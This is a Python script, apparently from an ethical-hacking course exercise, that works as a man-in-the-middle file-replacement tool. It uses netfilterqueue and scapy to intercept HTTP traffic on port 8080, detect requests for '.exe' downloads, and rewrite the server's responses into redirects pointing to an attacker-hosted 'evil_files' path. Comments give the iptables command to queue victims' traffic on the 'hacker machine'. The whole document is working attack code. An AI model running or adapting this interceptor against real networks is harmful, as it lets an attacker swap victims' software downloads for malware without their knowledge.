#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy
ack_list=[]
keyword='.exe'
LOAD = 'HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.209.138/evil_files/evil.txt'

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):#in scapy data sent in http layer are placed in raw layer
            if scapy_packet[scapy.TCP].dport == 8080 and '192.168.209.138' not in scapy_packet[scapy.Raw].load:
                if keyword in scapy_packet[scapy.Raw].load:
                    print('[+] '+ keyword+' request')
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    scapy_packet.show()
            if scapy_packet[scapy.TCP].sport == 8080:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("Replacing file")
                    modified_packet = set_load(scapy_packet,LOAD)
                    # modified_packet.show()
                    packet.set_payload(str(modified_packet))
    packet.accept()
    # packet.drop()



#iptables -I FORWARD -j NFQUEUE  --queue-num 0
#execute in hacker machine to create a queue
queue = netfilterqueue.NetfilterQueue() #create instance
queue.bind(0, process_packet)
queue.run()# connect with the we create in hacker machine ,
                                # 0: number of queue, process_packet: callback whenever get packet in queue